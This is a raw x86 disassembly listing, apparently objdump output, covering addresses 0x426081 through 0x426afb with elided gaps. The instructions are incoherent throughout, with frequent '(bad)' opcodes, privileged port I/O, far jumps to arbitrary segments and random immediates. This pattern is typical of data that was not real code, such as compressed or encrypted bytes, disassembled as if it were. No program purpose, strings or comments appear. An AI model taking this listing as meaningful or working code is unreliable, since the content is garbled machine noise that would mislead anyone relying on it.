  426081:	sub    eax,0x2b2365d0
  426086:	jmp    edi
  426088:	je     0x426050
  42608a:	push   edi
  42608b:	adc    DWORD PTR [esi+0x448a78d0],ebx
  426091:	in     al,0xa6
  426093:	jmp    0x426085
  426095:	addr16 aam 0x8f
  426098:	aad    0x42
  42609a:	mov    esi,ebp
  42609c:	pop    edi
  42609d:	mov    dh,0xbe
  42609f:	mov    ss,WORD PTR ds:0xe930970b
  4260a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260a6:	in     eax,0x54
  4260a8:	rol    DWORD PTR [edi+0x7c5588ce],cl
  4260ae:	pop    edx
  4260af:	pusha  
  4260b0:	xchg   BYTE PTR [edi-0x4b25f11c],bh
  4260b6:	int3   
  4260b7:	(bad)  
  4260b8:	adc    al,0x90
  4260ba:	clc    
  4260bb:	cmp    dh,BYTE PTR [edx]
  4260bd:	jmp    0x8f60:0x95b9450a
  4260c4:	sub    ebx,DWORD PTR ds:0x7fe08562
  4260ca:	xchg   BYTE PTR [ebx+0x4f],bl
  4260cd:	and    ah,BYTE PTR [edx+eiz*2]
  4260d0:	xchg   ebx,eax
  4260d1:	xchg   edx,eax
  4260d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260d3:	xlat   BYTE PTR ds:[ebx]
  4260d4:	sbb    bl,ah
  4260d6:	icebp  
  4260d7:	xchg   ebp,eax
  4260d8:	jno    0x426155
  4260da:	hlt    
  4260db:	fs cdq 
  4260dd:	fcmovnb st,st(7)
  4260df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260e0:	fidivr DWORD PTR [esi]
  4260e2:	cdq    
  4260e3:	pushf  
  4260e4:	sub    DWORD PTR [ebx+0x6f],esi
  4260e7:	aad    0x66
  4260e9:	xchg   esi,eax
  4260ea:	loope  0x42606d
  4260ec:	fcmovnbe st,st(0)
  4260ee:	daa    
  4260ef:	pop    eax
  4260f0:	sbb    eax,0x1ee1fc35
  4260f5:	cli    
  4260f6:	sub    edi,DWORD PTR [ebx-0x6d]
  4260f9:	xchg   esp,eax
  4260fa:	test   al,0xd1
  4260fc:	add    ecx,DWORD PTR [ecx-0x38d38e54]
  426102:	or     al,0xd2
  426104:	retf   
  426105:	pop    ebp
  426106:	xor    al,0x41
  426108:	cmp    al,0xe2
  42610a:	push   esp
  42610b:	mov    cl,0x9
  42610d:	sbb    al,0x6
  42610f:	xor    cl,BYTE PTR [edx-0x551de613]
  426115:	rcl    BYTE PTR [edi+0x6c],0x9f
  426119:	add    DWORD PTR [eax+0x4ec5d6ef],ebx
  42611f:	lds    esp,FWORD PTR [ecx-0x6157f1a0]
  426125:	jb     0x4260b8
  426127:	lea    esi,[esi]
  426129:	je     0x42616d
  42612b:	add    BYTE PTR [ebp-0x6cf5c1bf],al
  426131:	mov    ecx,0x765461
	...
  426196:	fwait
  426197:	and    DWORD PTR [edi],ecx
  426199:	popa   
  42619a:	mov    edi,0x6ffbff6f
  42619f:	sub    BYTE PTR [ebx-0x4f8bd57d],bh
  4261a5:	sti    
  4261a6:	cmp    edx,DWORD PTR [esi+0x1070001]
  4261ac:	add    BYTE PTR [eax],al
  4261ae:	rcl    DWORD PTR fs:[ebp-0x73a20209],cl
  4261b5:	add    eax,0x8146b8b2
  4261ba:	aad    0xbf
  4261bc:	dec    edi
  4261bd:	scas   al,BYTE PTR es:[edi]
  4261be:	(bad)  [eax+ecx*2]
  4261c1:	and    dl,bh
  4261c3:	add    ebx,DWORD PTR ds:0x99e57fbc
  4261c9:	test   al,0x69
  4261cb:	inc    ebx
  4261cc:	and    al,0x69
  4261ce:	nop
  4261cf:	mov    ebp,0x11484e4
  4261d4:	push   ebx
  4261d5:	stos   DWORD PTR es:[edi],eax
  4261d6:	dec    edi
  4261d7:	mov    eax,ds:0xbc4e995f
  4261dc:	sbb    BYTE PTR [edi-0x7c],ch
  4261df:	inc    esi
  4261e0:	je     0x42620f
  4261e2:	or     DWORD PTR [edi+0x5c],edi
  4261e5:	jne    0x426225
  4261e7:	lahf   
  4261e8:	mov    dh,BYTE PTR [edx+0x15]
  4261eb:	adc    BYTE PTR [ebx+eax*4-0x14f42182],0xab
  4261f3:	mov    al,ds:0xe53abbcc
  4261f8:	adc    BYTE PTR [edx+0x7cc28d03],0x2
  4261ff:	fld    QWORD PTR [ebx-0x6c]
  426202:	sbb    eax,0x557afcdc
  426207:	push   0xc9f3c0fe
  42620c:	sar    BYTE PTR [esi],1
  42620e:	xor    bl,al
  426210:	ins    DWORD PTR es:[edi],dx
  426211:	call   0x4aad:0x2274a73a
  426218:	jb     0x4261f2
  42621a:	outs   dx,BYTE PTR ds:[esi]
  42621b:	ds push edi
  42621d:	dec    ebp
  42621e:	add    dh,al
  426220:	add    al,0x4f
  426222:	inc    eax
  426223:	dec    esi
  426224:	mov    esp,0x488c9b76
  426229:	imul   ebx,DWORD PTR [edx-0x675dfbc6],0x73
  426230:	cli    
  426231:	mov    al,ds:0x9c0d30e6
  426236:	imul   esi,DWORD PTR [eax+0x668bf57],0xe7aac036
  426240:	dec    eax
  426241:	test   al,0x42
  426243:	cmp    bh,ah
  426245:	jp     0x4262b9
  426247:	jle    0x42621e
  426249:	mov    ah,BYTE PTR [edx-0x23ee49a8]
  42624f:	pop    edi
  426250:	out    dx,al
  426251:	call   0xd269bc75
  426256:	push   ecx
  426258:	and    al,ch
  42625a:	out    0x5,al
  42625c:	aam    0x4e
  42625e:	loop   0x4262ca
  426260:	xchg   esi,eax
  426261:	mov    bh,0x98
  426263:	mov    al,ds:0x58705261
  426268:	xor    eax,0xc22ee17
  42626d:	inc    ecx
  42626e:	inc    edi
  42626f:	push   eax
  426270:	dec    ecx
  426271:	retf   0x4b94
  426274:	jp     0x426217
  426276:	outs   dx,BYTE PTR ds:[esi]
  426277:	push   ebx
  426278:	idiv   edi
  42627a:	adc    DWORD PTR [ecx+0x77],esp
  42627d:	dec    ebx
  42627e:	and    al,0x59
  426280:	call   0xf258:0xcab2bc5
  426287:	not    ah
  426289:	add    BYTE PTR [edi+ebp*4],dh
  42628c:	add    esp,0x4a
  42628f:	shl    DWORD PTR [ecx],1
  426291:	jae    0x4262c5
  426293:	jmp    DWORD PTR [ebp+0x73]
  426296:	sahf   
  426297:	xchg   BYTE PTR [ebp+0x69cdf671],al
  42629d:	mov    esi,0x47bac406
  4262a2:	cmc    
  4262a3:	cmp    cl,BYTE PTR [esi-0x3cca05bb]
  4262a9:	mov    ecx,0xf77c1fe4
  4262ae:	cmp    BYTE PTR [ebx+0x2c],cl
  4262b1:	(bad)  
  4262b2:	jne    0x4262d5
  4262b4:	jno    0x4262b6
	...
  426316:	push   esp
  426317:	and    eax,0xeefd4e8d
  42631c:	xlat   BYTE PTR ds:[ebx]
  42631d:	aas    
  42631e:	ins    BYTE PTR es:[edi],dx
  42631f:	lods   al,BYTE PTR ds:[esi]
  426320:	ret    0x8a54
  426323:	iret   
  426324:	sub    edx,DWORD PTR [edx+0x42]
  426327:	xchg   edi,eax
  426328:	add    DWORD PTR [eax],eax
  42632a:	pop    es
  42632b:	add    DWORD PTR [eax],eax
  42632d:	add    BYTE PTR [esi+0x7b],dh
  426330:	pop    ss
  426331:	inc    esp
  426332:	inc    ebp
  426333:	out    0xea,eax
  426335:	stos   DWORD PTR es:[edi],eax
  426336:	push   esp
  426337:	jns    0x426316
  426339:	cmp    ebp,DWORD PTR [edi-0x505edafe]
  42633f:	dec    eax
  426340:	in     eax,dx
  426341:	repnz mov eax,0x59743621
  426347:	adc    eax,0x33b21ec9
  42634c:	mov    al,ds:0xdc490cde
  426351:	pop    edi
  426352:	shl    BYTE PTR [ecx],1
  426354:	jbe    0x4262e9
  426356:	jp     0x4263cf
  426358:	outs   dx,BYTE PTR ds:[esi]
  426359:	in     eax,0x45
  42635b:	sbb    bl,BYTE PTR [ecx]
  42635d:	arpl   WORD PTR [edi+0x13eeff83],sp
  426363:	xchg   BYTE PTR [eax-0x7535d01f],dl
  426369:	lock aas 
  42636b:	cmc    
  42636c:	and    DWORD PTR [ebx+0x4e2d38bb],eax
  426372:	(bad)  
  426374:	jg     0x426364
  426376:	(bad)  
  426377:	retf   0x28ed
  42637a:	or     eax,0x8cebff48
  42637f:	mov    ebp,0x5d39bf1d
  426385:	inc    esp
  426386:	jno    0x4263e0
  426388:	cld    
  426389:	jge    0x42637c
  42638b:	sbb    bl,BYTE PTR [ebx+0x61]
  42638e:	fxtract 
  426390:	ret    
  426391:	imul   eax,DWORD PTR [eax],0x5b0822a9
  426397:	popf   
  426398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426399:	and    BYTE PTR [eax],dh
  42639b:	outs   dx,BYTE PTR ds:[esi]
  42639c:	mov    edx,0x6a45affa
  4263a1:	mov    bh,0x6b
  4263a3:	xchg   ebx,eax
  4263a4:	fs scas eax,DWORD PTR es:[edi]
  4263a6:	data16 (bad) 
  4263a9:	dec    ecx
  4263aa:	out    dx,al
  4263ab:	push   0x6d
  4263ad:	ins    DWORD PTR es:[edi],dx
  4263ae:	enter  0x536c,0xf9
  4263b2:	inc    edi
  4263b3:	ret    0x852
  4263b6:	xchg   BYTE PTR [si],bh
  4263b9:	aad    0xc3
  4263bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263bc:	ds push eax
  4263be:	ret    0x6e1f
  4263c1:	mov    bh,0xc0
  4263c3:	out    0x5,al
  4263c5:	clc    
  4263c6:	dec    edi
  4263c7:	inc    esi
  4263c8:	fisttp WORD PTR [edi+0x3a68018]
  4263ce:	stos   DWORD PTR es:[edi],eax
  4263cf:	jnp    0x42642a
  4263d1:	dec    ebx
  4263d2:	inc    edx
  4263d3:	sbb    bh,ch
  4263d5:	push   ebp
  4263d6:	cli    
  4263d7:	mov    ds:0xc8797aed,eax
  4263dc:	mov    esp,DWORD PTR [edx+0xe]
  4263df:	or     esi,DWORD PTR [ebp+0x7e]
  4263e2:	cwde   
  4263e3:	jbe    0x426388
  4263e5:	xchg   DWORD PTR [eax+0x4f90535c],edx
  4263eb:	rcr    DWORD PTR [edx],1
  4263ed:	push   edi
  4263ee:	cmp    BYTE PTR [esi-0x62454963],dl
  4263f4:	mov    BYTE PTR [esi],cl
  4263f6:	pop    ebp
  4263f7:	cli    
  4263f8:	int    0xa6
  4263fa:	jnp    0x42643b
  4263fc:	cmp    DWORD PTR [edx],0x16
  4263ff:	in     al,dx
  426400:	xor    BYTE PTR [edx],dh
  426402:	jl     0x426442
  426404:	or     DWORD PTR [ebx-0x67bd1446],edi
  42640a:	ds xor eax,0x86508d1b
  426410:	and    DWORD PTR [ebx],ebp
  426412:	xchg   ebp,eax
  426413:	sbb    eax,DWORD PTR [ecx+0x74c28067]
  426419:	iret   
  42641a:	push   esp
  42641b:	inc    ebp
  42641c:	cmp    al,0x21
  42641e:	mov    ah,0x22
  426420:	and    ah,al
  426422:	das    
  426423:	clc    
  426424:	and    BYTE PTR [edi+esi*2+0x70],ah
  426428:	mov    ebp,0x5314e301
  42642d:	mov    eax,ds:0x118aea4c
  426432:	pop    ecx
  426433:	or     eax,0xd0
	...
  426494:	add    BYTE PTR [eax],al
  426496:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42649d:	outs   dx,DWORD PTR ds:[esi]
  42649e:	(bad)  
  42649f:	fistp  QWORD PTR [edx+0x4c]
  4264a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264a3:	push   0x1f
  4264a5:	jg     0x4264f0
  4264a7:	cwde   
  4264a8:	add    DWORD PTR [eax],eax
  4264aa:	pop    es
  4264ab:	add    DWORD PTR [eax],eax
  4264ad:	add    BYTE PTR [esi-0x5e],ch
  4264b0:	fcomp  st(6)
  4264b2:	mov    eax,ds:0xb2b4a9cc
  4264b7:	jnp    0x42648a
  4264b9:	xor    edi,esi
  4264bb:	push   ebx
  4264bc:	rol    DWORD PTR [edx+0x4a],1
  4264bf:	push   ebx
  4264c0:	xor    cl,ch
  4264c2:	jg     0x4264da
  4264c4:	jl     0x42646e
  4264c6:	mov    al,ds:0x5c79bbd9
  4264cb:	out    dx,al
  4264cc:	or     al,0x30
  4264ce:	sub    ch,BYTE PTR [eax+edi*8+0x77]
  4264d2:	push   edi
  4264d3:	add    dl,BYTE PTR [eax+0x35]
  4264d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264d7:	push   es
  4264d8:	leave  
  4264d9:	fsubr  st(5),st
  4264db:	xchg   edx,eax
  4264dc:	and    al,ch
  4264de:	scas   eax,DWORD PTR es:[edi]
  4264df:	cwde   
  4264e0:	inc    eax
  4264e1:	push   0xffffffec
  4264e3:	and    al,ch
  4264e5:	cmp    ax,0x576f
  4264e9:	sub    eax,DWORD PTR [eax]
  4264eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264ec:	xchg   edx,eax
  4264ed:	cmp    DWORD PTR [ebp-0xa],0xfffffff5
  4264f1:	jnp    0x4264aa
  4264f3:	pop    es
  4264f4:	(bad)  
  4264f5:	std    
  4264f6:	push   ds
  4264f7:	out    0x19,al
  4264f9:	out    0xda,al
  4264fb:	cmp    cl,dl
  4264fd:	xor    edi,eax
  4264ff:	cmp    al,0x10
  426501:	push   ecx
  426502:	dec    eax
  426503:	fdiv   DWORD PTR [eax-0x1672448d]
  426509:	cmp    DWORD PTR [eax+0x4baa464],0xffffffe1
  426510:	lahf   
  426511:	add    dl,BYTE PTR [ecx]
  426513:	dec    esp
  426514:	dec    ebp
  426515:	ja     0x4264fd
  426517:	ins    BYTE PTR es:[edi],dx
  426518:	pop    ss
  426519:	mov    al,0xad
  42651b:	int3   
  42651c:	add    BYTE PTR [eax+0x71b95156],ch
  426522:	cmp    ah,ah
  426524:	in     eax,0xf9
  426526:	frstor [ecx-0x29]
  426529:	xchg   esp,eax
  42652a:	mov    esi,0x678af983
  42652f:	int    0xe9
  426531:	pop    es
  426532:	js     0x4264d0
  426534:	inc    ebx
  426535:	push   cs
  426536:	into   
  426537:	ja     0x42652a
  426539:	test   BYTE PTR [edi+0x3e0fc055],ah
  42653f:	jo     0x426528
  426541:	pop    esp
  426542:	push   ebp
  426543:	ret    0x48f4
  426546:	mov    BYTE PTR [ebp-0xd1c3ed6],al
  42654c:	arpl   bp,si
  42654e:	fidiv  WORD PTR [ecx-0x323730cf]
  426554:	add    dh,0x59
  426557:	mov    bh,0x6b
  426559:	shl    BYTE PTR [esi],0x55
  42655c:	pushf  
  42655d:	outs   dx,DWORD PTR ds:[esi]
  42655e:	xchg   ecx,eax
  42655f:	stc    
  426560:	push   0xd68e0941
  426565:	out    0xe7,eax
  426567:	pusha  
  426568:	mov    esp,0xccc0ad1e
  42656d:	call   0xeab4c589
  426572:	(bad)  
  426573:	xchg   esi,eax
  426574:	sub    al,0x66
  426576:	sub    DWORD PTR [eax+ebp*4-0x18f5dde5],ecx
  42657d:	int3   
  42657e:	arpl   WORD PTR [eax],bp
  426580:	xchg   edx,eax
  426581:	sbb    BYTE PTR ds:0xef3dd57a,dh
  426587:	daa    
  426588:	mov    eax,0x3ed7b8e9
  42658d:	push   es
  42658e:	sub    BYTE PTR [ecx-0x3f550d90],ah
  426594:	add    al,0x92
  426596:	cmp    DWORD PTR [esi],edx
  426598:	push   0xffffffe6
  42659a:	or     DWORD PTR [ebx+0x27],esi
  42659d:	inc    edx
  42659e:	mov    edx,0xecf515aa
  4265a3:	or     al,BYTE PTR [edx+ecx*4-0x33]
  4265a7:	fnstcw WORD PTR [ecx-0x2]
  4265aa:	mov    ecx,0x2fbbdb64
  4265af:	push   ds
  4265b0:	stos   BYTE PTR es:[edi],al
  4265b1:	sub    ebp,esp
  4265b3:	(bad)  
  4265b4:	(bad)  
	...
  426615:	add    BYTE PTR [edx],dl
  426617:	retf   
  426618:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42661e:	xor    DWORD PTR [ecx+0x6f],0x2f
  426622:	in     eax,dx
  426623:	out    0x65,al
  426625:	mov    ss,WORD PTR [eax-0x67]
  426628:	add    DWORD PTR [eax],eax
  42662a:	pop    es
  42662b:	add    DWORD PTR [eax],eax
  42662d:	add    BYTE PTR [ebp-0x5a19d49b],al
  426633:	pop    edx
  426634:	nop/reserved BYTE PTR [edx+0xb]
  426638:	in     eax,0x48
  42663a:	(bad)  
  42663b:	pop    ds
  42663c:	popa   
  42663d:	mov    DWORD PTR [esi-0x78],edx
  426640:	std    
  426641:	dec    ebx
  426642:	jne    0x42669f
  426644:	pop    edx
  426645:	(bad)  
  426646:	jns    0x42662d
  426648:	dec    edi
  426649:	fisttp DWORD PTR [edi]
  42664b:	ds jne 0x4265fb
  42664e:	add    ebx,DWORD PTR [esi+0x61]
  426651:	rol    ah,cl
  426653:	rol    DWORD PTR [edx+0x7e821086],1
  426659:	jl     0x42660f
  42665b:	jns    0x42663b
  42665d:	ficom  WORD PTR [edi+ebx*8]
  426660:	(bad)  
  426661:	ins    DWORD PTR es:[edi],dx
  426662:	ret    
  426663:	ret    
  426664:	in     eax,0x32
  426666:	mov    edx,0x891508bb
  42666b:	jne    0x426697
  42666d:	jmp    0xc126b1e5
  426672:	pusha  
  426673:	and    BYTE PTR [ecx+0x43fde969],dh
  426679:	push   esp
  42667a:	mov    edi,0xadf287f3
  42667f:	xchg   ebp,eax
  426680:	push   esp
  426681:	mov    ebx,0x5a760202
  426686:	push   edx
  426687:	(bad)
  42668b:	bound  ebp,QWORD PTR [ebp-0x1a7465d4]
  426691:	mov    edx,0x3cffc0e4
  426696:	leave  
  426697:	mov    edi,0xf7527cc1
  42669c:	xor    bh,ch
  42669e:	pusha  
  42669f:	xchg   ecx,eax
  4266a0:	cmp    bh,BYTE PTR [ebp-0x7a]
  4266a3:	(bad)  
  4266a5:	loope  0x4266d6
  4266a7:	xchg   DWORD PTR [esi],esp
  4266a9:	sub    al,0x27
  4266ab:	and    al,0xe9
  4266ad:	or     BYTE PTR ds:0xf79878e1,ah
  4266b3:	add    dh,BYTE PTR [ecx]
  4266b5:	sbb    eax,0x79e516d0
  4266ba:	out    0x5d,al
  4266bc:	xchg   esp,eax
  4266bd:	sbb    DWORD PTR [ecx-0x11],0x3815a293
  4266c4:	or     ah,bh
  4266c6:	sbb    al,0xe4
  4266c8:	aas    
  4266c9:	xchg   DWORD PTR [eax],edi
  4266cb:	ja     0x4266e7
  4266cd:	push   cs
  4266ce:	inc    esp
  4266cf:	mov    bh,0x78
  4266d1:	aas    
  4266d2:	xor    al,0x87
  4266d4:	aam    0x84
  4266d6:	scas   al,BYTE PTR es:[edi]
  4266d7:	mov    al,0x18
  4266d9:	(bad)  
  4266da:	dec    edi
  4266db:	push   0xffffffcd
  4266dd:	(bad)  
  4266de:	add    al,BYTE PTR cs:[ecx]
  4266e1:	xchg   ebx,eax
  4266e2:	out    0xc,al
  4266e4:	into   
  4266e5:	mov    cl,BYTE PTR [ebp+0x46]
  4266e8:	mov    esp,0xacec08fd
  4266ed:	xor    BYTE PTR [esi],ch
  4266ef:	sar    esi,cl
  4266f1:	test   dl,dh
  4266f3:	pop    esp
  4266f4:	fcmovbe st,st(0)
  4266f6:	and    eax,0xb018d18e
  4266fb:	xchg   DWORD PTR cs:[edi+0x31],eax
  4266ff:	out    dx,al
  426700:	repnz out dx,eax
  426702:	jmp    0x8b33:0x5bb7a412
  426709:	out    0xab,eax
  42670b:	loope  0x4266bb
  42670d:	adc    edx,DWORD PTR [esi+0x29]
  426710:	(bad)  
  426711:	jbe    0x426693
  426713:	int    0x9a
  426715:	ss push esi
  426717:	mov    edx,0x22116634
  42671c:	sbb    DWORD PTR [edx],ebp
  42671e:	jns    0x4266e3
  426720:	xor    eax,0xfea0d27d
  426725:	mov    esi,0xb0415a10
  42672a:	iret   
  42672b:	sti    
  42672c:	or     eax,0x27b7e669
  426731:	ret    
  426732:	pop    edx
  426733:	dec    ebp
  426734:	out    dx,al
	...
  426795:	add    BYTE PTR [eax-0xd53173],bh
  42679b:	imul   edi,esp,0xffffff9f
  42679e:	sbb    esp,eax
  4267a0:	leave  
  4267a1:	dec    ebx
  4267a2:	shl    DWORD PTR [ebp+0x2],0x32
  4267a6:	push   edi
  4267a7:	call   0x0:0x1070001
  4267ae:	mov    ch,0x22
  4267b0:	jns    0x42679b
  4267b2:	rcr    DWORD PTR [eax],0xdb
  4267b5:	dec    ecx
  4267b6:	icebp  
  4267b7:	cwde   
  4267b8:	aaa    
  4267b9:	jb     0x426782
  4267bb:	xchg   esp,eax
  4267bc:	stos   DWORD PTR es:[edi],eax
  4267bd:	das    
  4267be:	test   al,0x8f
  4267c0:	cmp    esi,DWORD PTR [ecx-0x78dbf284]
  4267c6:	inc    eax
  4267c7:	call   0x3a3d:0x50ba255
  4267ce:	arpl   WORD PTR [edi+ebx*4+0x42a2bda2],di
  4267d5:	js     0x4267ff
  4267d7:	in     al,dx
  4267d8:	pop    ebp
  4267d9:	push   edx
  4267da:	dec    eax
  4267db:	xchg   edx,eax
  4267dc:	dec    esp
  4267dd:	frstor [ebx-0x730100d4]
  4267e3:	adc    eax,0x7b52e52b
  4267e8:	pusha  
  4267e9:	mov    eax,0x8fecf51c
  4267ee:	iret   
  4267ef:	mov    bh,0xe7
  4267f1:	lea    edi,[eax+0x1a833ae6]
  4267f7:	jle    0x426871
  4267f9:	xor    DWORD PTR [edx+0x69],esp
  4267fc:	rcr    dl,cl
  4267fe:	push   DWORD PTR [edi-0x2d]
  426801:	loopne 0x4267b3
  426803:	arpl   WORD PTR [edi],di
  426805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426806:	(bad)  
  426807:	mov    bl,0x6b
  426809:	inc    esp
  42680a:	repz dec ecx
  42680c:	ja     0x42681c
  42680e:	push   eax
  42680f:	aam    0x6d
  426811:	add    bl,BYTE PTR [edi]
  426813:	retf   0xb963
  426816:	vpcmov xmm5,xmm6,xmm1,xmm4
  42681c:	mov    ecx,0xb0c4ca60
  426821:	nop
  426822:	imul   esp,DWORD PTR [ebp+eax*8+0x373e3d78],0xfffffff3
  42682a:	or     esi,DWORD PTR [esi+edi*1-0xc4052dc]
  426831:	adc    dh,BYTE PTR [ebp+0x6b]
  426834:	mov    ecx,0x2c815c4
  426839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42683a:	adc    BYTE PTR [esi+0x2],bl
  42683d:	es mov edx,0x17b231ad
  426843:	cmp    dl,BYTE PTR [ebp-0x5fd16d9c]
  426849:	call   0x4b5e:0xdc1dd973
  426850:	(bad)  
  426852:	dec    ecx
  426853:	test   BYTE PTR [ebx+0x6b],0x0
  426857:	and    DWORD PTR [edx],edi
  426859:	pop    edi
  42685a:	inc    eax
  42685b:	dec    ebp
  42685c:	sub    DWORD PTR [edi],0x35
  42685f:	popa   
  426860:	sub    ecx,edx
  426862:	push   cs
  426863:	dec    ecx
  426864:	sbb    DWORD PTR [esi-0x698e381a],esi
  42686a:	push   ss
  42686b:	je     0x4268e3
  42686d:	ja     0x42686d
  42686f:	sbb    al,0x83
  426871:	ret    
  426872:	add    ebx,edi
  426874:	leave  
  426875:	xor    eax,0xc91bbb77
  42687a:	push   0xe8391e06
  42687f:	int    0x1e
  426881:	test   DWORD PTR cs:[eax-0x51003236],ebx
  426888:	cdq    
  426889:	sahf   
  42688a:	mov    edx,0xc84d8d01
  42688f:	loopne 0x426872
  426891:	sti    
  426892:	add    DWORD PTR [esi],edi
  426894:	push   ebp
  426895:	rol    ebx,1
  426897:	or     eax,0x1d04e75b
  42689c:	cmp    cl,BYTE PTR [esi-0x375013f]
  4268a2:	add    al,0x6a
  4268a4:	ficom  DWORD PTR [ebp-0x2e]
  4268a7:	out    dx,eax
  4268a8:	mov    WORD PTR [ecx-0x2e526ebf],es
  4268ae:	pop    ss
  4268af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268b0:	push   esi
  4268b1:	xchg   BYTE PTR [esi],al
  4268b3:	int3   
  4268b4:	enter  0x0,0x0
	...
  426914:	add    BYTE PTR [eax],al
  426916:	mov    WORD PTR [esi+0x7d],cs
  426919:	jge    0x42691a
  42691b:	jg     0x4268a9
  42691d:	jmp    FWORD PTR [esi]
  42691f:	out    0xa0,eax
  426921:	stos   DWORD PTR es:[edi],eax
  426922:	jmp    0x426951
  426924:	mov    esp,0x19b5edc
  426929:	add    BYTE PTR [edi],al
  42692b:	add    DWORD PTR [eax],eax
  42692d:	add    dh,bh
  42692f:	je     0x42695b
  426931:	inc    esp
  426932:	jne    0x4268fd
  426934:	add    esi,edi
  426936:	and    eax,ecx
  426938:	fldcw  WORD PTR [edx+0x4a]
  42693b:	call   0x7925:0x7a1ae03c
  426942:	cli    
  426943:	jmp    0x987a59f4
  426948:	test   BYTE PTR [edi+ebp*1],0x13
  42694c:	add    eax,ebp
  42694e:	es test eax,0x4c5459f6
  426954:	pop    edi
  426955:	popa   
  426956:	or     bl,BYTE PTR [ebx-0x53f6dbc2]
  42695c:	cmp    edi,ecx
  42695e:	xor    eax,edx
  426960:	sub    dh,ch
  426962:	dec    edi
  426963:	mov    dl,0xab
  426965:	and    BYTE PTR [edx*8-0x76f1a38f],dh
  42696c:	call   0xaf6a:0x997982e6
  426973:	clc    
  426974:	xor    DWORD PTR [ebx+0x6e763f32],ecx
  42697a:	outs   dx,BYTE PTR ds:[esi]
  42697b:	jae    0x426930
  42697d:	xchg   ecx,eax
  42697e:	jo     0x42699c
  426980:	jnp    0x426990
  426982:	jle    0x426970
  426984:	cli    
  426985:	ins    DWORD PTR es:[edi],dx
  426986:	jmp    0x42699d
  426988:	mov    bl,0xd
  42698a:	sub    cl,BYTE PTR [ecx-0x6dcb027f]
  426990:	jae    0x42698f
  426992:	sbb    al,0xd5
  426994:	loope  0x4269f0
  426996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426997:	sbb    eax,0xd92e84fe
  42699c:	add    DWORD PTR [edx+0x26cf0ccf],esi
  4269a2:	adc    eax,0x6399e980
  4269a7:	sub    ecx,eax
  4269a9:	dec    edi
  4269aa:	mov    bh,0x41
  4269ac:	mov    BYTE PTR [ebp+0x5f],ah
  4269af:	mov    esp,0xa2444dfc
  4269b4:	sbb    eax,0xe4d9df49
  4269b9:	push   es
  4269ba:	push   ss
  4269bb:	add    cl,BYTE PTR [ecx]
  4269bd:	rcl    DWORD PTR [edi],cl
  4269bf:	pop    ebp
  4269c0:	addr16 pop ecx
  4269c2:	xor    eax,edx
  4269c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269c5:	mov    eax,0x85254b7a
  4269ca:	sbb    eax,0x3407f34a
  4269cf:	aas    
  4269d0:	cmp    al,0xa5
  4269d2:	mov    dh,0x3a
  4269d4:	push   cs
  4269d5:	in     al,0x7e
  4269d7:	push   0xcd1323be
  4269dc:	retf   0xf901
  4269df:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4269e1:	cmp    BYTE PTR [ebx-0x7db93eb4],dh
  4269e7:	push   ebp
  4269e8:	lods   eax,DWORD PTR ds:[esi]
  4269e9:	repnz das 
  4269eb:	mov    esi,0x1813fa90
  4269f0:	or     edx,0xf907c9dd
  4269f6:	cli    
  4269f7:	into   
  4269f8:	fwait
  4269f9:	sub    edx,edi
  4269fb:	into   
  4269fc:	and    BYTE PTR [edi+0x32be3414],bl
  426a02:	dec    bh
  426a04:	cmp    eax,0x12ef867
  426a09:	pushf  
  426a0a:	fld    QWORD PTR [eax+0x4cb7cee3]
  426a10:	push   ebp
  426a11:	mov    al,0x43
  426a13:	mov    al,0x24
  426a15:	into   
  426a16:	mov    dh,BYTE PTR [ebx+0x6c]
  426a19:	jl     0x426a5c
  426a1b:	ss repnz dec edi
  426a1e:	fidiv  WORD PTR [edi+0x39]
  426a21:	(bad)  
  426a22:	jmp    0x307f:0xa5104133
  426a29:	arpl   WORD PTR [esi],bx
  426a2b:	cmp    DWORD PTR [edx+eax*2],esi
  426a2e:	(bad)  
  426a2f:	lahf   
  426a30:	arpl   WORD PTR [edx+0x28],ax
  426a33:	sbb    DWORD PTR [eax+eax*1+0x0],edi
	...
  426a93:	add    BYTE PTR [eax],al
  426a95:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426a9b:	ja     0x426a78
  426a9d:	out    dx,eax
  426a9e:	xor    dl,BYTE PTR [edi+eiz*4]
  426aa1:	cld    
  426aa2:	sbb    DWORD PTR [ebp-0x639a091c],esp
  426aa8:	add    DWORD PTR [eax],eax
  426aaa:	pop    es
  426aab:	add    DWORD PTR [eax],eax
  426aad:	add    BYTE PTR [edi],cl
  426aaf:	mov    ds:0x68991200,eax
  426ab4:	pop    ss
  426ab5:	mov    ss,WORD PTR [esi-0x59]
  426ab8:	dec    eax
  426ab9:	or     al,ah
  426abb:	arpl   WORD PTR [edi-0x54],ax
  426abe:	jb     0x426b07
  426ac0:	stos   DWORD PTR es:[edi],eax
  426ac1:	ss jmp 0x9d71:0x535917fe
  426ac9:	(bad)  
  426acb:	adc    edi,DWORD PTR [ebx+ebx*4]
  426ace:	loope  0x426a79
  426ad0:	lahf   
  426ad1:	sbb    eax,0xfe11bffb
  426ad6:	add    edx,DWORD PTR [ebx+0x70]
  426ad9:	outs   dx,DWORD PTR ds:[esi]
  426ada:	pop    ds
  426adb:	push   esi
  426adc:	inc    edi
  426add:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ade:	cld    
  426adf:	jno    0x5e677c47
  426ae5:	repz jno 0x426b0f
  426ae8:	cmp    cl,BYTE PTR [eax+esi*2+0x490f7b48]
  426aef:	fnsave ds:0x9d21650
  426af5:	mov    edx,0x362b55c5
  426afa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426afb:	call   0x3da68f67
